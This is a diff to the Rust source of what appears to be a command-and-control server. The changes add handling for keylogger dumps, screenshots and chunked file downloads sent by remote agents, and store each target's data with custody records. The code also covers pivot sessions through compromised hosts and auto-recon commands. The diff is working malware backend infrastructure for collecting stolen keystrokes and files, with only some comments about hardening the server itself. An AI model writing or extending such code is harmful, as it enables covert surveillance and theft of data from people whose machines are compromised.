@@ -4,23 +4,205 @@ use tokio::sync::{mpsc, oneshot};
 use std::net::SocketAddr;
 use std::sync::atomic::{Ordering, AtomicU32};
 use ed25519_dalek::{SigningKey, Signer};
-use chrono::Utc;
+use chrono::{DateTime, Utc};
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
 use std::collections::HashMap;
 use std::pin::Pin;
 use std::future::Future;
 use tracing::{info, warn, error};
-use std::fs;
-use std::path::Path;
 
 use rhai;
 use crate::common::{ClientHello, Session, SecuredCommand, CommandResponse, SharedSessions, PivotFrame, MalleableProfile};
 use crate::database::{self, DbPool};
 use crate::api::SharedResults;
-use crate::file_transfer;
+use crate::rcm::{self, PackageManager, CollectedMeta, ScreenshotMeta, KeyCapture, KeyEvent};
+use std::sync::Arc;
 use crate::transport::{BoxedStream, C2Stream};
 
-/// Check if a host string is in the private 172.16.0.0/12 range (172.16–31.x.x).
+/// Build the SPEC §5.3 os-version fingerprint entry shared by
+/// seed_rcm_fingerprint (at registration) and package_for_session (on the
+/// first artifact, when the package is lazily created AFTER registration).
+/// uid is ABSENT - insufficient data for the REQ-7.2 hash, which Table 1
+/// permits during collection.
+fn os_fingerprint_entry(hostname: &str, os: &str, computer_id: &str) -> rcm::fingerprint::FingerprintEntry {
+    rcm::fingerprint::FingerprintEntry {
+        target: "machine".into(),
+        fp_type: "os".into(),
+        version: 1,
+        uid: None,
+        fields: vec![
+            ("hostname".into(), hostname.to_string()),
+            ("osversion".into(), os.to_string()),
+            ("usertag".into(), "NONE".into()),
+            ("private_rcm_computerid".into(), computer_id.to_string()),
+        ],
+    }
+}
+
+/// Upsert a fingerprint entry into a package (non-fatal): conflicts are
+/// surfaced as operator-visible warnings (REQ-7.6.3/16.1), errors logged.
+fn upsert_fingerprint_entry(pkg: &PackageManager, hostname: &str, entry: rcm::fingerprint::FingerprintEntry) {
+    match pkg.update_fingerprint(&entry) {
+        Ok(rcm::UpsertOutcome::ConflictKept(keys)) => {
+            warn!("RCM fingerprint conflict for {}: existing value kept for key(s): {}",
+                hostname, keys.join(", "));
+        }
+        Ok(_) => {}
+        Err(e) => warn!("RCM fingerprint seed failed for {}: {}", hostname, e),
+    }
+}
+
+/// Resolve the RCM package for a session via the sessions DB table.
+///
+/// With lazy packages, registration usually precedes package creation, so
+/// seed_rcm_fingerprint no-ops and the lazily-created package's fingerprint
+/// would otherwise lack `osversion` until the next re-registration. After
+/// resolving (or creating) the package here, upsert the os-version
+/// enrichment entry. The upsert is idempotent (NoChange when identical),
+/// so the per-artifact cost is one XML read.
+fn package_for_session(db: &DbPool, sess_id: u32) -> Option<Arc<PackageManager>> {
+    let conn = db.get().ok()?;
+    let (hostname, computer_id, os) = conn.query_row(
+        "SELECT hostname, computer_id, os FROM sessions WHERE id = ?1",
+        rusqlite::params![sess_id],
+        |r| Ok((r.get::<_, String>(0)?, r.get::<_, String>(1)?, r.get::<_, String>(2)?))
+    ).ok()?;
+    let pkg = rcm::registry().for_target(&hostname, &computer_id).ok()?;
+    if !os.is_empty() {
+        upsert_fingerprint_entry(&pkg, &hostname, os_fingerprint_entry(&hostname, &os, &computer_id));
+    }
+    Some(pkg)
+}
+
+/// Parse a keylog-entry timestamp into UTC. Entries may carry an ISO-8601
+/// string or a Unix epoch as int/float; anything unparseable yields None
+/// (callers fall back to capture-time now).
+fn rcm_entry_ts(v: &serde_json::Value) -> Option<DateTime<Utc>> {
+    use chrono::TimeZone;
+    if let Some(s) = v.as_str() {
+        if let Ok(dt) = DateTime::parse_from_rfc3339(s) {
+            return Some(dt.with_timezone(&Utc));
+        }
+        if let Ok(ndt) = chrono::NaiveDateTime::parse_from_str(s, "%Y-%m-%dT%H:%M:%S%.f") {
+            return Some(Utc.from_utc_datetime(&ndt));
+        }
+        None
+    } else if let Some(n) = v.as_i64() {
+        Utc.timestamp_opt(n, 0).single()
+    } else if let Some(f) = v.as_f64() {
+        Utc.timestamp_opt(f as i64, 0).single()
+    } else {
+        None
+    }
+}
+
+/// Build a ScreenshotMeta with only the fields we actually know populated;
+/// every other optional key is None (rendered as NONE in the sidecar).
+fn rcm_screenshot_meta(captured_at: DateTime<Utc>, toolspecific: String, monitor: Option<String>) -> ScreenshotMeta {
+    ScreenshotMeta {
+        captured_at,
+        toolspecific,
+        ext: "png".to_string(),
+        originalsize: None,
+        isfullscreen: None,
+        isminimized: None,
+        activewindow: None,
+        pid: None,
+        imagename: None,
+        windowtitle: None,
+        session: None,
+        user: None,
+        monitor,
+    }
+}
+
+/// Look up the RCM package for a target WITHOUT creating one. Registration
+/// uses this so that mere check-ins (including unauthenticated legacy builds)
+/// cannot mint on-disk package trees - packages are created lazily on the
+/// first real artifact (package_for_session -> registry().for_target creates).
+/// The screenshot-listing API route uses it for the same reason: a GET must
+/// never mint package dirs, and the `.rcmtarget` marker compare prevents
+/// hostname-collision misattribution.
+///
+/// NOTE: rcm::registry::get_if_exists does not exist yet, so this mirrors
+/// registry::for_target's key derivation and PackageManager::create_or_open's
+/// root-name candidate loop exactly, but STOPS at the first missing candidate
+/// instead of creating it, and opens the match via by_root_name (which never
+/// creates). Keep in sync with src/rcm/{registry,package}.rs.
+pub(crate) fn package_if_exists(hostname: &str, computer_id: &str) -> Option<Arc<PackageManager>> {
+    let reg = rcm::registry();
+    // Key derivation identical to registry::for_target (it doubles as the
+    // instance id written into .rcmtarget).
+    let key: &str = if !computer_id.is_empty() {
+        computer_id
+    } else if !hostname.is_empty() {
+        hostname
+    } else {
+        "unknown-target"
+    };
+    // Root-name derivation identical to PackageManager::create_or_open.
+    let mut name = rcm::paths::sanitize_root_name(hostname);
+    if name.is_empty() {
+        name = rcm::paths::sanitize_component(key);
+    }
+    if name.is_empty() {
+        name = "unknown-target".to_string();
+    }
+
+    let base = reg.base().to_path_buf();
+    let mut n = 0u64;
+    loop {
+        let cand = if n == 0 { name.clone() } else { format!("{}.{}", name, n) };
+        let root = base.join(&cand);
+        match root.symlink_metadata() {
+            Ok(md) => {
+                // Symlink/foreign entry: same skip rule as create_or_open.
+                if md.file_type().is_symlink() || !md.is_dir() {
+                    n += 1;
+                } else {
+                    let marker =
+                        std::fs::read_to_string(root.join(".rcmtarget")).unwrap_or_default();
+                    if marker.trim() == key {
+                        // Existing package for this target - open (no create).
+                        return reg.by_root_name(&cand).ok();
+                    }
+                    n += 1; // folder belongs to a different target
+                }
+            }
+            // First missing candidate: create_or_open would CREATE here.
+            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return None,
+            Err(_) => return None,
+        }
+        if n > 1024 {
+            // Pathological collision-storm guard.
+            return None;
+        }
+    }
+}
+
+/// Seed the RCM package fingerprint for a freshly registered target
+/// (SPEC §5.3). uid is ABSENT - insufficient data for the REQ-7.2 hash,
+/// which Table 1 permits during collection. Non-fatal: errors are logged.
+///
+/// Lazy packages: the fingerprint is only enriched when a package ALREADY
+/// exists on disk; registration itself must never create one.
+pub(crate) fn seed_rcm_fingerprint(hostname: &str, computer_id: &str, os: &str) {
+    let (hostname, computer_id, os) =
+        (hostname.to_string(), computer_id.to_string(), os.to_string());
+    tokio::task::spawn_blocking(move || {
+        match package_if_exists(&hostname, &computer_id) {
+            Some(pkg) => {
+                upsert_fingerprint_entry(&pkg, &hostname,
+                    os_fingerprint_entry(&hostname, &os, &computer_id));
+            }
+            // No package on disk yet - it will be created (and seeded) on the
+            // first collected artifact; nothing to enrich at registration.
+            None => {}
+        }
+    });
+}
+
+/// Check if a host string is in the private 172.16.0.0/12 range (172.16-31.x.x).
 /// The old `starts_with("172.")` incorrectly blocked public IPs like Google's
 /// 172.217.x.x range.
 fn is_private_172(host: &str) -> bool {
@@ -212,7 +394,7 @@ pub fn handle_connection(
 
             // Decode the received HMAC from base64, then use verify_slice which
             // does a constant-time comparison internally and returns Err on any
-            // mismatch — including length differences — without panicking.
+            // mismatch - including length differences - without panicking.
             let received_raw = match BASE64.decode(resp.hmac.as_bytes()) {
                 Ok(b) => b,
                 Err(_) => {
@@ -238,6 +420,9 @@ pub fn handle_connection(
                 );
             }
         }
+
+        // Seed the RCM fingerprint for this target (SPEC §5.3) - non-fatal.
+        seed_rcm_fingerprint(&hello.hostname, &hello.computer_id, &hello.os);
         
         let conn_type = if let Some(pid) = parent_id { format!("Tunneled via #{}", pid) } else { "Direct".to_string() };
         
@@ -271,7 +456,7 @@ pub fn handle_connection(
 
                                 // Phase 2: DNS resolution check. Resolves the hostname
                                 // and validates every resolved IP against private ranges.
-                                // This catches DNS rebinding (attacker.com → 127.0.0.1),
+                                // This catches DNS rebinding (attacker.com -> 127.0.0.1),
                                 // alt IP encodings (0x7f000001, 2130706433), and IPv6
                                 // mapped IPv4 (::ffff:127.0.0.1) that bypass string checks.
                                 //
@@ -417,7 +602,7 @@ pub fn handle_connection(
                                       "Auto-recon module not found");
                             }
                         } else {
-                            // Regular command or ext:load — send directly to agent
+                            // Regular command or ext:load - send directly to agent
                             let _ = tx_recon.send((cmd, None));
                         }
                         // Stagger entries slightly
@@ -478,7 +663,7 @@ pub fn handle_connection(
                                 if let Some(v_sender) = virtual_sessions.get(&child_id) {
                                     if !frame.data.is_empty() { let _ = v_sender.send(frame.data); }
                                 } else {
-                                    // New Pivot Logic — cap to prevent resource exhaustion
+                                    // New Pivot Logic - cap to prevent resource exhaustion
                                     // from a compromised agent flooding with fake child_ids.
                                     const MAX_VIRTUAL_SESSIONS: usize = 64;
                                     if virtual_sessions.len() >= MAX_VIRTUAL_SESSIONS {
@@ -544,144 +729,466 @@ pub fn handle_connection(
     })
 }
 
-async fn process_response(sess_id: u32, r: CommandResponse, results: &SharedResults, db: &DbPool) {
-    // --- KEYLOGGER DUMP HANDLING ---
-    if r.output.starts_with("KEYLOG_DUMP:") {
-        let content = r.output.trim_start_matches("KEYLOG_DUMP:").to_string();
-        if content.trim().is_empty() { return; }
+/// Known `file:` wire-message prefixes (SPEC §4). A line that starts with
+/// one of these is a protocol message; anything else in a multi-line
+/// response is plain command output that must fall through to the normal
+/// output path (results map + DB + println) rather than vanish.
+const WIRE_PREFIXES: [&str; 5] = [
+    "file:meta|",
+    "file:data_batch|",
+    "file:data|",
+    "file:chunk|",
+    "file:report_batch|",
+];
 
-        let sess_id_copy = sess_id;
+/// Partition a multi-line response into known `file:` wire messages and
+/// plain output lines, preserving order within each class.
+fn partition_wire_lines(output: &str) -> (Vec<String>, Vec<&str>) {
+    let mut wire = Vec::new();
+    let mut plain = Vec::new();
+    for line in output.lines() {
+        if WIRE_PREFIXES.iter().any(|p| line.starts_with(p)) {
+            wire.push(line.to_string());
+        } else {
+            plain.push(line);
+        }
+    }
+    (wire, plain)
+}
+
+/// Log a malformed `file:` wire line: to the package log when the session's
+/// package is resolvable, else to tracing. Malformed wire lines must never
+/// be silently dropped (framing-injection hardening).
+fn log_wire_malformed(sess_id: u32, pkg: Option<&Arc<PackageManager>>, msg: &str) {
+    match pkg {
+        Some(p) => {
+            let _ = p.log("agent", "ERROR", msg);
+        }
+        None => warn!(sess_id, "{}", msg),
+    }
+}
+
+/// Handle one line of the `file:` wire family (SPEC §4). `pkg` is the
+/// session's RCM package, resolved ONCE per response by the caller (None
+/// when the session row/package is unavailable); all storage goes through
+/// it and progress/failure messages go to the package log (Sec 13).
+/// `transfer_id` identifies the owning command (its request id) so chunked
+/// transfers of the same path never mix their .part slots.
+fn handle_file_line(
+    sess_id: u32,
+    line: &str,
+    pkg: Option<&Arc<PackageManager>>,
+    transfer_id: &str,
+) {
+    use rcm::custody::CustodyAction;
+
+    // file:meta|<batch_ts>|<rel>|<abs>|<json_b64> - optional metadata
+    // announcement sent BEFORE the file data it describes.
+    if let Some(rest) = line.strip_prefix("file:meta|") {
+        let parts: Vec<&str> = rest.splitn(4, '|').collect();
+        if parts.len() != 4 {
+            log_wire_malformed(sess_id, pkg,
+                &format!("malformed file:meta line ({} of 4 fields after prefix)", parts.len()));
+            return;
+        }
+        let (batch_ts, rel, abs, json_b64) = (parts[0], parts[1], parts[2], parts[3]);
+        let parsed = BASE64.decode(json_b64).ok()
+            .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok());
+        match (pkg, parsed) {
+            (Some(pkg), Some(j)) => {
+                let get = |k: &str| j.get(k).and_then(|v| v.as_str()).map(|s| s.to_string());
+                // RFC3339 UTC strings pass through as canonical (they are
+                // already UTC ISO); accept as-is.
+                let meta = CollectedMeta {
+                    modified: get("modified"),
+                    accessed: get("accessed"),
+                    created:  get("created"),
+                    owner:    get("owner"),
+                    group:    get("group"),
+                };
+                pkg.note_file_meta(batch_ts, rel, abs, meta);
+            }
+            (Some(pkg), None) => {
+                let _ = pkg.log("agent", "ERROR",
+                    &format!("malformed file:meta payload for {} (b64/json decode failed)", rel));
+            }
+            (None, _) => {
+                warn!(sess_id, "No RCM package for session; dropping file:meta");
+            }
+        }
+        return;
+    }
+
+    // file:data_batch|<batch>|<root>|<rel>|<perms>|<b64> - legacy batch
+    // message (current agents no longer send it); kept working.
+    if line.starts_with("file:data_batch|") {
+        let parts: Vec<&str> = line.splitn(6, '|').collect();
+        if parts.len() != 6 {
+            log_wire_malformed(sess_id, pkg,
+                &format!("malformed file:data_batch line ({} of 6 fields)", parts.len()));
+            return;
+        }
+        let (batch, root, rel, b64) = (parts[1], parts[2], parts[3], parts[5]);
+        let Some(pkg) = pkg else {
+            error!(sess_id, file = rel, "No RCM package for session; dropping file:data_batch");
+            return;
+        };
+        let (abs, meta) = pkg.take_file_meta(batch, rel)
+            .unwrap_or_else(|| (rel.to_string(), CollectedMeta::default()));
+        match BASE64.decode(b64) {
+            Ok(bytes) => match pkg.store_collected(&abs, &bytes, &meta) {
+                Ok(stored) => {
+                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
+                        None, Some(&format!("Collected {}", abs)));
+                    let _ = pkg.log("agent", "INFO",
+                        &format!("Downloaded: {} (batch {} root {}) -> {}", rel, batch, root, stored));
+                }
+                Err(e) => {
+                    let _ = pkg.log("agent", "ERROR", &format!("FAILED: {} - {}", rel, e));
+                }
+            },
+            Err(e) => {
+                let _ = pkg.log("agent", "ERROR", &format!("FAILED: {} - b64 decode: {}", rel, e));
+            }
+        }
+        return;
+    }
+
+    // file:data|<path>|<perms>|<b64> - single-file download.
+    if line.starts_with("file:data|") {
+        let parts: Vec<&str> = line.splitn(4, '|').collect();
+        if parts.len() != 4 {
+            log_wire_malformed(sess_id, pkg,
+                &format!("malformed file:data line ({} of 4 fields)", parts.len()));
+            return;
+        }
+        let (path, b64) = (parts[1], parts[3]);
+        let Some(pkg) = pkg else {
+            error!(sess_id, file = path, "No RCM package for session; dropping file:data");
+            return;
+        };
+        let (abs, meta) = pkg.take_file_meta("-", path)
+            .unwrap_or_else(|| (path.to_string(), CollectedMeta::default()));
+        match BASE64.decode(b64) {
+            Ok(bytes) => match pkg.store_collected(&abs, &bytes, &meta) {
+                Ok(stored) => {
+                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
+                        None, Some(&format!("Collected {}", abs)));
+                    let _ = pkg.log("agent", "INFO",
+                        &format!("collected {} -> {}", abs, stored));
+                    info!(sess_id, file = path, "File Downloaded Successfully");
+                    // `stored` is already package-relative
+                    // ("downloads/C/..."); prefix the root name once.
+                    println!("\n[+] Single Download: {}/{}", pkg.root_name(), stored);
+                }
+                Err(e) => {
+                    let _ = pkg.log("agent", "ERROR",
+                        &format!("store failed for {}: {}", abs, e));
+                    error!(sess_id, file = path, error = %e, "File Download Failed");
+                    println!("\n[-] Save Error: {}", e);
+                }
+            },
+            Err(e) => {
+                let _ = pkg.log("agent", "ERROR",
+                    &format!("b64 decode failed for {}: {}", path, e));
+                error!(sess_id, file = path, error = %e, "File Download Failed");
+                println!("\n[-] Save Error: {}", e);
+            }
+        }
+        return;
+    }
+
+    // file:chunk|<batch_ts>|<root>|<rel>|<idx>|<total>|<b64> - one piece of
+    // a chunked large-file transfer (7 fields, 6 pipes -> splitn(7)).
+    if line.starts_with("file:chunk|") {
+        let parts: Vec<&str> = line.splitn(7, '|').collect();
+        if parts.len() != 7 {
+            log_wire_malformed(sess_id, pkg,
+                &format!("malformed file:chunk line ({} of 7 fields)", parts.len()));
+            return;
+        }
+        let (batch_ts, root, rel) = (parts[1], parts[2], parts[3]);
+        // Parse as u64 - agent uses u64 to handle files >4 GB on 32-bit targets.
+        let chunk_idx    = parts[4].parse::<u64>().unwrap_or(0);
+        let total_chunks = parts[5].parse::<u64>().unwrap_or(1);
+        let Some(pkg) = pkg else {
+            error!(sess_id, file = rel, "No RCM package for session; dropping file:chunk");
+            return;
+        };
+        // NOTE: for old agents the rel path of single-file chunked
+        // downloads is the absolute path with '/' separators -
+        // paths::reconstruct_download_components handles it.
+        // PEEK (not take) so every chunk of a multi-chunk transfer
+        // resolves the same announced abs path + metadata; the entry is
+        // evicted only after the transfer finalizes (Ok(true)).
+        let (abs, meta) = pkg.peek_file_meta(batch_ts, rel)
+            .unwrap_or_else(|| (rel.to_string(), CollectedMeta::default()));
+        match BASE64.decode(parts[6]) {
+            Ok(bytes) => match pkg.store_collected_chunk(&abs, chunk_idx, total_chunks, &bytes, transfer_id, &meta) {
+                Ok(true) => {
+                    // Finalized: evict the meta-cache entry now.
+                    let _ = pkg.take_file_meta(batch_ts, rel);
+                    info!(sess_id, file = rel, chunks = total_chunks, "Chunked download complete");
+                    let _ = pkg.custody("rcm-server", CustodyAction::Collect,
+                        None, Some(&format!("Collected {}", abs)));
+                    let _ = pkg.log("agent", "INFO",
+                        &format!("Downloaded: {} ({} chunks) [batch {} root {}]", rel, total_chunks, batch_ts, root));
+                }
+                Ok(false) => { /* mid-transfer; .part kept for resumption */ }
+                Err(e) => {
+                    error!(sess_id, file = rel, chunk = chunk_idx, error = %e, "Chunk save failed");
+                    let _ = pkg.log("agent", "ERROR",
+                        &format!("FAILED chunk {}/{} for {}: {}", chunk_idx, total_chunks, rel, e));
+                }
+            },
+            Err(e) => {
+                error!(sess_id, file = rel, chunk = chunk_idx, error = %e, "Chunk b64 decode failed");
+                let _ = pkg.log("agent", "ERROR",
+                    &format!("FAILED chunk {}/{} for {}: b64 decode: {}", chunk_idx, total_chunks, rel, e));
+            }
+        }
+        return;
+    }
+
+    // file:report_batch|<batch>|<root>|<json> - batch summary. Recorded in
+    // the package log + custody chain; NO report file on disk.
+    if line.starts_with("file:report_batch|") {
+        let parts: Vec<&str> = line.splitn(4, '|').collect();
+        if parts.len() != 4 {
+            log_wire_malformed(sess_id, pkg,
+                &format!("malformed file:report_batch line ({} of 4 fields)", parts.len()));
+            return;
+        }
+        let (batch, root, json) = (parts[1], parts[2], parts[3]);
+        let Some(pkg) = pkg else {
+            error!(sess_id, batch = root, "No RCM package for session; dropping file:report_batch");
+            return;
+        };
+        let _ = pkg.log("agent", "INFO", &format!("batch report {}: {}", root, json));
+        // One-line custody summary parsed from the report counts.
+        let summary = serde_json::from_str::<serde_json::Value>(json)
+            .map(|j| {
+                let found = j["total_files_found"].as_u64().unwrap_or(0);
+                let ok = j["total_success"].as_u64().unwrap_or(0);
+                let failed = j["failed_downloads"].as_array().map(|a| a.len()).unwrap_or(0);
+                format!("batch {}: {} found, {} collected, {} failed", batch, found, ok, failed)
+            })
+            .unwrap_or_else(|_| format!("batch {} report received", batch));
+        let _ = pkg.custody("rcm-server", CustodyAction::Collect, None, Some(&summary));
+        info!(sess_id, batch = root, "Batch Download Complete");
+        println!("\n[+] Batch Complete: {} — {}", root, summary);
+        return;
+    }
+}
+
+/// Extract the payload of a `<MARKER>:` dump (e.g. KEYLOG_DUMP) from command
+/// output. Returns Some(payload) ONLY when the output actually IS a dump:
+///   - output starts with "<MARKER>:"                       -> rest is payload
+///   - output is the job wrapper "JOB_FINAL:<id>|<MARKER>:…" -> payload after
+///     the wrapper prefix, marker anchored at the remainder start
+/// Any other output that merely CONTAINS the marker substring (ordinary
+/// shell output mentioning it, or a crafted suffix) returns None so it
+/// falls through to the normal output path UNTOUCHED.
+fn extract_dump_payload<'a>(output: &'a str, marker: &str) -> Option<&'a str> {
+    let prefixed = format!("{}:", marker);
+    if let Some(rest) = output.strip_prefix(prefixed.as_str()) {
+        return Some(rest);
+    }
+    if let Some(rest) = output.strip_prefix("JOB_FINAL:") {
+        if let Some((_, after)) = rest.split_once('|') {
+            return after.strip_prefix(prefixed.as_str());
+        }
+    }
+    None
+}
+
+/// Central command-response pipeline (TLS path). Also used by the HTTP
+/// listener so HTTP-transported agents get identical RCM packaging,
+/// keylog/screenshot extraction, results-map insert and DB persistence.
+pub async fn process_response(sess_id: u32, mut r: CommandResponse, results: &SharedResults, db: &DbPool) {
+    // --- KEYLOGGER DUMP HANDLING -> RCM Sec-12 keylog package ---
+    // The dump is handled ONLY when the output IS a dump (starts with the
+    // marker, or the JOB_FINAL:<id>|<MARKER>: wrapper) - never when an
+    // ordinary shell output merely mentions the marker substring.
+    let keylog_payload = extract_dump_payload(&r.output, "KEYLOG_DUMP").map(str::to_string);
+    if let Some(content) = keylog_payload {
+        if content.trim().is_empty() {
+            // Empty dump: do NOT swallow the response (polling
+            // /api/hosts/:id/output/:req_id would hang forever). Fall
+            // through to the normal completion path with a "nothing
+            // captured" output.
+            r.output = "keylog dump was empty; nothing captured".to_string();
+        } else {
+
+        let db_kl = db.clone();
         // Move all blocking file I/O into spawn_blocking
-        let folder_result = tokio::task::spawn_blocking(move || -> Result<String, String> {
-            // Include milliseconds to prevent collisions when an agent flushes
-            // multiple keylog dumps within the same second. Two dumps landing
-            // in the same folder would overwrite each other's screenshot files.
-            let timestamp = Utc::now().format("%Y%m%d_%H%M%S_%3f").to_string();
-            let folder_name = format!("keylog_{}_{}", timestamp, sess_id_copy);
-            let base_path = Path::new("downloads").join(&folder_name);
-            
-            fs::create_dir_all(&base_path).map_err(|e| format!("mkdir: {}", e))?;
+        let store_result = tokio::task::spawn_blocking(move || -> Result<Option<String>, String> {
+            let pkg = package_for_session(&db_kl, sess_id)
+                .ok_or_else(|| "no RCM package for session".to_string())?;
+            let now = Utc::now();
 
-            let mut processed_entries = Vec::new();
-            let mut raw_keyboard_text = String::new();
+            // Parse the JSONL stream into ONE Sec-12 KeyCapture. A
+            // window_change entry closes the current KeyEvent and opens a
+            // new one carrying the window title; keystrokes append to the
+            // current event's keys. Screenshot entries are embedded as
+            // Sec-11 screenshots (toolspecific "keylog").
+            let mut events: Vec<KeyEvent> = Vec::new();
+            let mut current: Option<KeyEvent> = None;
+            let mut min_ts: Option<DateTime<Utc>> = None;
+            let mut max_ts: Option<DateTime<Utc>> = None;
+            let mut keystroke_count: u64 = 0;
+            let mut shot_count: u64 = 0;
 
-            for (index, line) in content.lines().enumerate() {
+            for line in content.lines() {
                 if line.trim().is_empty() { continue; }
-                if let Ok(mut entry) = serde_json::from_str::<serde_json::Value>(line) {
-                    if entry["type"] == "window_change" {
-                        if let Some(title) = entry["data"]["title"].as_str() {
-                            raw_keyboard_text.push_str(&format!("\n\n[Title: {}]\n", title));
-                        }
+                let Ok(entry) = serde_json::from_str::<serde_json::Value>(line) else { continue; };
+                let entry_dt = rcm_entry_ts(&entry["timestamp"]);
+                if let Some(dt) = entry_dt {
+                    min_ts = Some(match min_ts { Some(m) => m.min(dt), None => dt });
+                    max_ts = Some(match max_ts { Some(m) => m.max(dt), None => dt });
+                }
+                match entry["type"].as_str() {
+                    Some("window_change") => {
+                        if let Some(ev) = current.take() { events.push(ev); }
+                        let title = entry["data"]["title"].as_str().unwrap_or("").to_string();
+                        current = Some(KeyEvent {
+                            time: rcm::xml::canonical_ts(&entry_dt.unwrap_or(now)),
+                            pid: None,
+                            imagename: None,
+                            windowtitle: Some(title),
+                            keys: String::new(),
+                        });
                     }
-                    if entry["type"] == "keystroke" {
+                    Some("keystroke") => {
+                        keystroke_count += 1;
+                        let ks_ts = rcm::xml::canonical_ts(&entry_dt.unwrap_or(now));
+                        if current.is_none() {
+                            // Keystroke before any window_change: open a
+                            // default event stamped with the first keystroke.
+                            current = Some(KeyEvent {
+                                time: ks_ts.clone(),
+                                pid: None,
+                                imagename: None,
+                                windowtitle: None,
+                                keys: String::new(),
+                            });
+                        }
+                        let ev = current.as_mut().unwrap();
+                        if ev.keys.is_empty() {
+                            // Table 7: an <event>'s <time> is the time of the
+                            // FIRST KEYSTROKE in that event (not the
+                            // window_change time that opened it).
+                            ev.time = ks_ts;
+                        }
                         if let Some(key) = entry["data"]["key"].as_str() {
-                            raw_keyboard_text.push_str(key);
+                            ev.keys.push_str(key);
                         }
                     }
-                    if entry["type"] == "screenshot" {
+                    Some("screenshot") => {
                         if let Some(b64_str) = entry["data"]["image_b64"].as_str() {
                             if let Ok(bytes) = BASE64.decode(b64_str) {
-                                let raw_kind = entry["data"]["kind"].as_str().unwrap_or("unknown");
-                                let kind: String = raw_kind.chars()
-                                    .filter(|c| c.is_alphanumeric() || *c == '_' || *c == '-')
-                                    .take(32).collect();
-                                let kind = if kind.is_empty() { "unknown".to_string() } else { kind };
-                                // Sanitize timestamp: strip ALL characters except alphanumerics,
-                                // hyphens, and underscores. The old code only replaced : and .
-                                // but left / and \ intact. Path::join with an absolute path
-                                // (e.g. "/etc/cron.d/evil") REPLACES the base entirely,
-                                // giving a compromised agent arbitrary file write on the C2.
-                                // Extract timestamp — JSON timestamps can be strings
-                                // ("2024-01-15T10:30:00") or integers (Unix epoch).
-                                // as_str() returns None for integers, causing all
-                                // screenshots to collide on filename "0".
-                                let raw_ts = &entry["timestamp"];
-                                let ts_str = if let Some(s) = raw_ts.as_str() {
-                                    s.to_string()
-                                } else if let Some(n) = raw_ts.as_i64() {
-                                    n.to_string()
-                                } else if let Some(f) = raw_ts.as_f64() {
-                                    format!("{:.0}", f)
-                                } else {
-                                    "0".to_string()
+                                let mut meta = rcm_screenshot_meta(
+                                    entry_dt.unwrap_or(now),
+                                    "keylog".to_string(),
+                                    None,
+                                );
+                                // REQ-11.2: the stored extension follows the
+                                // announced image kind when it names a known
+                                // format; otherwise default to png.
+                                let kind = entry["data"]["kind"].as_str().unwrap_or("");
+                                meta.ext = match kind {
+                                    "png" | "jpg" | "bmp" => kind.to_string(),
+                                    _ => "png".to_string(),
                                 };
-                                let img_ts: String = ts_str
-                                    .chars()
-                                    .filter(|c| c.is_alphanumeric() || *c == '-' || *c == '_')
-                                    .take(64)
-                                    .collect();
-                                let img_ts = if img_ts.is_empty() { "0".to_string() } else { img_ts };
-                                let img_filename = format!("{}_img_{}_{}.png", img_ts, index, kind);
-                                if fs::write(base_path.join(&img_filename), bytes).is_ok() {
-                                    if let Some(obj) = entry["data"].as_object_mut() {
-                                        obj.remove("image_b64");
-                                        obj.insert("saved_file".to_string(), serde_json::json!(img_filename));
+                                match pkg.store_screenshot(&bytes, &meta) {
+                                    Ok(_) => shot_count += 1,
+                                    Err(e) => {
+                                        let _ = pkg.log("agent", "ERROR",
+                                            &format!("keylog screenshot store failed: {}", e));
                                     }
                                 }
                             }
                         }
                     }
-                    processed_entries.push(entry);
+                    _ => {}
                 }
             }
+            if let Some(ev) = current.take() { events.push(ev); }
 
-            let _ = fs::write(base_path.join("raw_keyboard.txt"), raw_keyboard_text);
-            let _ = fs::write(base_path.join("session_log.json"), serde_json::to_string_pretty(&processed_entries).unwrap_or_default());
-            Ok(folder_name)
+            if keystroke_count == 0 {
+                // No keystrokes: do NOT write a keylog document with zero
+                // keystroke events. Screenshots embedded in the dump may
+                // still have been stored above - say so accurately, and
+                // record custody ONLY in that case (no artifact, no claim).
+                if shot_count > 0 {
+                    let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
+                        None, Some(&format!("Captured {} keylog screenshot frame(s)", shot_count)));
+                }
+                let msg = if shot_count > 0 {
+                    format!("keylog dump contained no keystrokes; {} screenshot(s) stored", shot_count)
+                } else {
+                    "keylog dump contained no keystrokes; nothing stored".to_string()
+                };
+                let _ = pkg.log("agent", "INFO", &msg);
+                return Ok(None);
+            }
+
+            let capture = KeyCapture {
+                starttime: rcm::xml::canonical_ts(&min_ts.unwrap_or(now)),
+                endtime: Some(rcm::xml::canonical_ts(&max_ts.unwrap_or(now))),
+                user: None,
+                events,
+            };
+            let rel = pkg.store_keylog(&[capture]).map_err(|e| e.to_string())?;
+            let _ = pkg.custody("rcm-server", rcm::custody::CustodyAction::Collect,
+                None, Some("Keylog captured"));
+            let _ = pkg.log("agent", "INFO", "keylog captured");
+            Ok(Some(format!("downloads/{}/{}", pkg.root_name(), rel)))
         }).await;
 
-        let msg = match folder_result {
-            Ok(Ok(folder_name)) => {
-                info!(sess_id, folder = %folder_name, "Keylogs Processed");
-                format!("Keylogs extracted to: downloads/{}", folder_name)
+        let msg = match store_result {
+            Ok(Ok(Some(path))) => {
+                info!(sess_id, path = %path, "Keylogs Processed");
+                format!("Keylogs extracted to: {}", path)
+            }
+            Ok(Ok(None)) => {
+                info!(sess_id, "Keylog dump contained no keystrokes");
+                "Keylog dump contained no keystrokes; nothing captured".to_string()
             }
             _ => "Keylog extraction failed".to_string(),
         };
         println!("\n[+] {}", msg);
-        
+
+        // Operator-facing results map gets the extraction status; the DB
+        // keeps the ORIGINAL raw dump output so the payload is not lost.
+        let raw_output = r.output.clone();
         let mut modified_response = r.clone();
         modified_response.output = msg;
-        let log_output = modified_response.output.clone();
         let log_error = modified_response.error.clone();
 
         results.lock().unwrap_or_else(|e| e.into_inner()).insert((sess_id, r.request_id), modified_response);
         let db_inner = db.clone();
         tokio::task::spawn_blocking(move || {
             if let Ok(conn) = db_inner.get() {
-                database::save_client_output(&conn, sess_id, r.request_id, &log_output, &log_error);
+                database::save_client_output(&conn, sess_id, r.request_id, &raw_output, &log_error);
             }
         });
         return;
+        }
     }
 
     // --- SCREENSHOT DUMP HANDLING ---
